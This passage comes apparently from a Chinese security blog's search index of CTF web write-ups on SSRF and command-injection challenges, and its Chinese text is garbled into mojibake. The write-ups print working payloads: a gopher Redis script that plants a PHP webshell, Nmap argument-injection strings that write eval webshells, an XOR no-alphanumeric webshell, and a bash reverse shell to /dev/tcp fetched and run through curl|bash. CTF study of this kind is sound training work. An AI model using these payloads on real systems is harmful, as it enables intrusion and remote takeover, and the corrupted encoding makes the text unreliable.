urllib.parse.quote(hash_sign[1][len(url):])&#125;)print(r.text) æ–¹æ³•äºŒ è¦æƒ³è¿›å…¥å¯¹actionåˆ¤æ–­çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚å…ˆéªŒè¯ç­¾åï¼š 12345def checkSign(self): if getSign(self.action, self.param) == self.sign: return True else: return False åœ¨checkSign()å‡½æ•°çš„æ¯”è¾ƒä¸­ï¼Œå·¦è¾¹æ˜¯getSign(self.action, self.param)ï¼Œå³è¾¹æ˜¯getSign('scan', param)ï¼ˆå› ä¸ºåœ¨è®¿é—®geneSigné¡µé¢æ—¶ï¼Œæ˜¯è‡ªåŠ¨ä¼ å…¥scanå‚æ•°ï¼‰ã€‚ å¦‚æœå†å†™æ·±ä¸€ç‚¹ï¼Œå·¦è¾¹æ˜¯md5(key + self.param + self.action)ï¼Œè€ƒè™‘åˆ°è¦è¯»å–flag.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆmd5(key + 'flag.txt' + self.action)ã€‚ ä¸ºäº†ä¿è¯Exec()å‡½æ•°ä¸­scanéƒ¨åˆ†å’Œreadéƒ¨åˆ†éƒ½èƒ½è¢«æ‰§è¡Œï¼Œself.actionå¿…é¡»æœ‰readscanæˆ–scanreadè¿™æ ·çš„å­—ç¬¦ä¸²ï¼ˆæ³¨æ„ï¼šæºç ä¸­ç”¨inæ“ä½œç¬¦è€Œä¸æ˜¯ç”¨==ï¼‰ã€‚ ç­‰å·å³è¾¹æ˜¯md5(key + param + 'scan')ï¼Œæ‰€ä»¥å¯ä»¥å°†ç­‰å·å·¦è¾¹çš„self.actionå®šä¸ºreadscanã€‚ è¿™æ ·ä¸€æ¥ï¼Œç­‰å·å·¦è¾¹ä¸ºmd5(key + 'flag.txt' + 'readscan')ï¼Œç°åœ¨å°±å‰©ä¸‹ç­‰å·å³è¾¹çš„paramå‚æ•°æ²¡æœ‰ç¡®å®šï¼Œé‚£ä¹ˆä¸ºäº†éªŒè¯é€šè¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†param=flag.txtreadä¼ å‚ã€‚ æœ€åä¹Ÿå°±ç­‰ä»·äºmd5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') payload1 payload2 GKCTF2020 Ezweb æ‰“å¼€é¢˜ç›®æŸ¥çœ‹æºä»£ç  æ·»åŠ ä¸€ä¸‹?secretå‚æ•°ï¼Œè¿”å›äº†ifconfigå‘½ä»¤çš„ç»“æœ åº”è¯¥æ˜¯SSRFæ¼æ´åˆ©ç”¨äº†ï¼Œå…ˆå°è¯•ç”¨fileåè®®è¯»æ–‡ä»¶ï¼Œå‘ç°è¢«banæ‰äº†ï¼Œç”¨file:/æˆ–è€…file: ///ç»•è¿‡ï¼š payloadï¼šfile: ///var/www/html/index.php å®¡è®¡ä¸€ä¸‹ä»£ç  1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;åˆ«è¿™æ ·&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; ä»æºç ä¸­å¯çŸ¥è¿‡æ»¤äº†fileåè®®ã€dictåè®®ã€127.0.0.1å’Œlocalhostï¼Œä½†æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ã€‚ æ—¢ç„¶ç»™äº†å†…ç½‘åœ°å€ï¼Œé‚£ä¹ˆå…ˆhttpåè®®æ¢æµ‹ä¸€ä¸‹å†…ç½‘ä¸»æœºå­˜æ´»ï¼Œç›´æ¥ä¸Šå·¥å…·Fuzzï¼š 11ç«¯å£çš„å›æ˜¾ç»™äº†ä¸€ä¸ªhint æ¥ç€ç”¨httpåè®®å»Fuzzè¿™ä¸ªä¸»æœºçš„ç«¯å£ å‘ç°äº†è¿è¡Œç€RedisæœåŠ¡ï¼Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬ç”Ÿæˆpayloadï¼š 12345678910111213141516171819202122232425262728293031import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.10.238.11&quot; // è¿è¡Œæœ‰redisçš„ä¸»æœºipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload ç”ŸæˆPayloadåç›´æ¥æ”¾åœ¨è¾“å…¥æ¡†ä¸­æ‰“è¿‡å»ï¼Œå†è¾“å…¥http://173.10.238.11/shell.php HITCON 2017 SSRFme TODO ç½‘é¼æ¯ 2018 Fakebook TODO ç½‘é¼æ¯ 2020 ç„æ­¦ç»„ SSRFMe TODO","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"SSRF","slug":"CTF/SSRF","permalink":"http://ca0y1h.top/categories/CTF/SSRF/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”XSS","date":"2020-08-18T09:58:47.000Z","path":"Web_security/ctf_writeup/8.buuctfåˆ·é¢˜â€”â€”XSS/","text":"[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2 [CISCN2019 åä¸œå—èµ›åŒº]Web9","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"XSS","slug":"CTF/XSS","permalink":"http://ca0y1h.top/categories/CTF/XSS/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”å‘½ä»¤æ‰§è¡Œ","date":"2020-08-18T09:58:31.000Z","path":"Web_security/ctf_writeup/10.buuctfåˆ·é¢˜â€”â€”å‘½ä»¤æ‰§è¡Œ/","text":"GXYCTF2019 Ping Ping Ping TODO ACTF2020 æ–°ç”Ÿèµ› Exec TODO BUUCTF2018 Online Tool è€ƒç‚¹ Nmapå‚æ•°æ³¨å…¥ è§£é¢˜ 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; å‚è€ƒä¹‹å‰å­¦ä¹ PHPä»£ç å®¡è®¡çš„ä¸€ç¯‡æ–‡ç« ï¼Œescapeshellargå‡½æ•°å’Œescapeshellcmdå‡½æ•°åŒæ—¶ä½¿ç”¨ä¼šå¯¼è‡´å•å¼•å·é€ƒé€¸ã€‚ æµ‹è¯•ä»£ç ï¼š 123456789101112&lt;?php$host = &quot;&#x27; &lt;?php phpinfo();?&gt; -oN shell.php &#x27;&quot;;$host = (string)$host;echo &quot;host:&quot;.$host;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$arg = escapeshellarg($host);echo &quot;arg:&quot;.$arg;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$cmd = escapeshellcmd($arg);echo &quot;cmd:&quot;.$cmd;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;?&gt; å¯¹äºå•ä¸ªå•å¼•å·, escapeshellarg()å‡½æ•°è½¬ä¹‰å,è¿˜ä¼šåœ¨å·¦å³å„åŠ ä¸€ä¸ªå•å¼•å·,ä½†escapeshellcmd()å‡½æ•°æ˜¯ç›´æ¥åŠ ä¸€ä¸ªè½¬ä¹‰ç¬¦ã€‚ å¯¹äºæˆå¯¹çš„å•å¼•å·, escapeshellcmd()å‡½æ•°é»˜è®¤ä¸è½¬ä¹‰,ä½†escapeshellarg()å‡½æ•°è½¬ä¹‰ã€‚ hostå‚æ•°å…ˆç»è¿‡escapeshellarg()å†ç»è¿‡escapeshellcmd()å°±ä¼šå‡ºç°é—®é¢˜ã€‚ escapeshellarg å…ˆè½¬ä¹‰äº†ä¸€ä¸ªå•å¼•å·,ç„¶åå¼•å…¥äº†ä¸€å¯¹å•å¼•å·, escapeshellcmd ä¸ä¼šè½¬ä¹‰æˆå¯¹çš„å•å¼•å·,ä½†æ˜¯ä¼šè½¬ä¹‰è½¬ç§»ç¬¦\\ï¼Œè¿™æ ·, è½¬ç§»ç¬¦ä½œç”¨å¤±æ•ˆ,é€ƒé€¸å‡ºæ¥ä¸€ä¸ªå•å¼•å·ã€‚ payloadï¼š 1?host&#x3D;&#39; &lt;?php &#96;cat &#x2F;flag&#96;;?&gt; -oN shell.php &#39; ç½‘é¼æ¯2020 æœ±é›€ç»„ Nmap è€ƒç‚¹ Nmapå‚æ•°æ³¨å…¥ è§£é¢˜ å’Œä¸Šé¢ä¸€é“é¢˜æ¯”è¾ƒåƒäº†ï¼Œéƒ½æ˜¯è€ƒå¯ŸNmapå‚æ•°æ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæºç ã€‚ ç›´æ¥ç”¨Online Toolçš„payloadè¿›è¡Œæµ‹è¯• 1&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39; æç¤ºhackerï¼ŒFuzzä¹‹åå‘ç°åº”è¯¥æ˜¯è¿‡æ»¤PHPå…³é”®å­—ï¼Œæ”¹ç”¨çŸ­æ ‡ç­¾å’Œphtmlåç¼€ç»•è¿‡ã€‚ 1&#39; &lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39; æ²¡æœ‰æç¤ºå…¶ä»–é»‘åå•ä¿¡æ¯ï¼Œè®¿é—®å½“å‰ç›®å½•ä¸‹çš„hack.phtmlæ–‡ä»¶å­˜åœ¨ï¼Œç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flagã€‚ å‚è€ƒæ–‡ç« ï¼šhttps://zhuanlan.zhihu.com/p/145906109 RoarCTF2019 Easy Calc è€ƒç‚¹ ä»£ç å®¡è®¡ PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassï¼šhttps://www.freebuf.com/articles/web/213359.html è§£é¢˜ æŸ¥çœ‹æºä»£ç ï¼š 123456789101112131415161718&lt;script&gt; //å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒURLç¼–ç å¹¶ä»¥GETæ–¹å¼è®¿é—®è¯·æ±‚ $(&#x27;#calc&#x27;).submit(function()&#123; $.ajax(&#123; url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), type:&#x27;GET&#x27;, success:function(data)&#123; $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt; &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125; &lt;/div&gt;`); &#125;, error:function()&#123; alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;); &#125; &#125;) return false; &#125;)&lt;/script&gt; è®¿é—®calc.phpï¼š 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; ç¬¬13è¡Œevalå¯ä»¥æ‰§è¡ŒPHPä»£ç ï¼Œæµ‹è¯•å‘ç°numå‚æ•°ä¸èƒ½è¾“å…¥éæ•°å­—çš„å€¼ï¼Œå¦åˆ™ä¼šç›´æ¥500ã€‚ payloadï¼š 1calc.php?%20num&#x3D;phpinfo() ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚ ä»£ç ä¸­è¿‡æ»¤äº†/ï¼Œç”¨chrç»•è¿‡ï¼š 1http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47))) è¯»å–/f1aggï¼š 1http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)) watevrCTF-2019 Supercalc TODO RCTF2019 calcalcalc TODO De1CTF 2019 9calc TODO GXYCTF2019 ç¦æ­¢å¥—å¨ƒ è€ƒç‚¹ Gitæºç æ³„éœ² æ— å‚æ•°webshell è§£é¢˜ dirmapæ‰«æå‘ç°æœ‰Gitç›®å½•ï¼Œç”¨GitHack downloadä¸‹æ¥ï¼Œå®¡è®¡ä»£ç ï¼š 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼/[a-z,_]+\\((?R)?\\)/å¾ˆæ˜æ˜¾æ˜¯æ— å‚æ•°webshellï¼Œç›´æ¥ä¸ŠpayloadæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š 1?exp&#x3D;var_dump(scandir(pos(localeconv()))); 1readfile(array_rand(array_flip(scandir(current(localeconv()))))); array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ array_flip() array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚ å½“ç„¶ï¼Œè¿˜å¯ä»¥å†™headerå­—æ®µï¼Œç„¶åç”¨get_all_header()å‡½æ•°è·å¾—flag.phpæ–‡ä»¶ã€‚ BJDCTF 2nd duangShell è€ƒç‚¹ swpæ–‡ä»¶æ³„éœ² åå¼¹shell è§£é¢˜ æ‰“å¼€é¢˜ç›®æç¤ºswpæ–‡ä»¶æ³„éœ²ï¼Œè®¿é—®.index.php.swpä¸‹è½½æ–‡ä»¶ï¼Œvim -r index.php.swpæ¢å¤æ–‡ä»¶ã€‚ 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;give me a girl&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123; die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);&#125; else &#123; $girl = $_POST[&#x27;girl_friend&#x27;]; if (preg_match(&#x27;/\\&gt;|\\\\\\/&#x27;, $girl)) &#123; die(&#x27;just girl&#x27;); &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i&#x27;, $girl)) &#123; echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; //duangShell~~~~ exec($girl); &#125;&#125; è§‚å¯Ÿæºä»£ç ä¹‹åå‘ç°æ˜¯ç»•è¿‡è¿‡æ»¤ä¹‹åå‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®ã€‚ å› ä¸ºè¿‡æ»¤äº†$ç¬¦å·ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨è¿™ç§é»‘åå•æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡ 1a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c ç¦ç”¨äº†base64ä¹‹åä¸èƒ½ä½¿ç”¨base64ç¼–ç ç»•è¿‡ 1echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d è€Œä¸”exec()å‡½æ•°æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåˆæƒ³äº†ä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ï¼Œç€å®ä¸è¡Œï¼Œçœ‹å¸ˆå‚…ä»¬çš„åšå®¢å§ã€‚ è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯åå¼¹shellï¼Œå…ˆç”¨å°å·å¼€ä¸€ä¸ªLinuxé¶æœºï¼Œç”¨SSHç™»å½•ä¸Šå»ï¼ŒæŸ¥çœ‹ipåœ°å€ã€‚ åœ¨/var/www/html/re_shell.txtå†™å…¥åå¼¹shellå‘½ä»¤ï¼š 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1 å†ç›‘å¬æœ¬åœ°çš„å¯¹åº”ç«¯å£ï¼Œåœ¨é¶æœºä¸Šè®¿é—® 1girl_friend&#x3D;curl http:&#x2F;&#x2F;[ip]&#x2F;[æ–‡ä»¶å]|bash æœ¬æœºè·å¾—shellåï¼ŒæŸ¥æ‰¾flag 1find &#x2F; -name *flag* æå®¢å¤§æŒ‘æˆ˜2019 RCE ME è€ƒç‚¹ æ— æ•°å­—å­—æ¯çš„webshell disable_functionç»•è¿‡ è§£é¢˜ å®¡è®¡ä»£ç  1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; è¿™ä¸ªçŸ¥è¯†ç‚¹éƒ½è¦è€ƒçƒ‚äº†ï¼Œå…ˆç”¨phpinfoéªŒè¯ä¸€ä¸‹ï¼Œç›´æ¥ç»™payloadï¼š 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo å…ˆæ„é€ ä¸€ä¸ªshellï¼Œç”¨èšå‰‘è¿æ¥ 1?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27]) PHP7.0 è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œphpè¯­å¥ï¼ŒPHP7.1ä¹‹åå°±ä¸è¡Œäº†ã€‚ ç„¶åå†åŠ è½½ç»•è¿‡disable_functionçš„æ’ä»¶ï¼Œè¿è¡Œreadflagå³å¯ã€‚ WUSTCTF2020 æœ´å®æ— å è€ƒç‚¹ intvalå‡½æ•°ç»•è¿‡ md5å¼±ç±»å‹ Linuxå‘½ä»¤ç©ºæ ¼å’Œcatç»•è¿‡ è§£é¢˜ æ ¹æ®hintè®¿é—®fl4g.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;; else die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;å¿«åˆ°éæ´²äº†&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;?&gt; å¥—å¨ƒé¢˜ï¼Œä¸€å±‚ä¸€å±‚çš„æ¥çœ‹ã€‚ ç¬¬ä¸€å±‚æ˜¯ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡intvalå‡½æ•°çš„ifåˆ¤æ–­ï¼Œç»™ä¸€ä¸ªdemo 123456789&lt;?php$a=&quot;3e4&quot;;echo intval($a);// 3$b=&quot;3e4&quot;;echo intval($b+1);?&gt;// 30001 è¿™æ˜¯å› ä¸ºè¿›è¡Œ+1æ“ä½œçš„æ—¶å€™ä¼šå…ˆå°†$açš„ç§‘å­¦è®¡æ•°æ³•è§£æç„¶åå†åŠ 1ã€‚ ä»¥ä¸‹åªé€‚åˆphp7.0åŠä»¥ä¸‹ç‰ˆæœ¬ ç¬¬äºŒå±‚æ˜¯md5çš„å¼±æ¯”è¾ƒ 12340e215962017md5å€¼ï¼š0e2912424769407768451503085778240e2159620md5å€¼ï¼š0e2159620 ç¬¬ä¸‰å±‚æ˜¯ç»•è¿‡ç©ºæ ¼å’Œcatå‘½ä»¤ï¼Œç©ºæ ¼çš„ä»£æ›¿æ–¹å¼$&#123;IFS&#125;ã€$IFSï¼Œcatçš„ä»£æ›¿æ–¹å¼ca\\tã€sortã€moreç­‰ç­‰ã€‚ CISCN2019 ååŒ—èµ›åŒº love math è€ƒç‚¹ ä»£ç å®¡è®¡ è§£é¢˜ 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //ä¾‹å­ c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#x27;echo 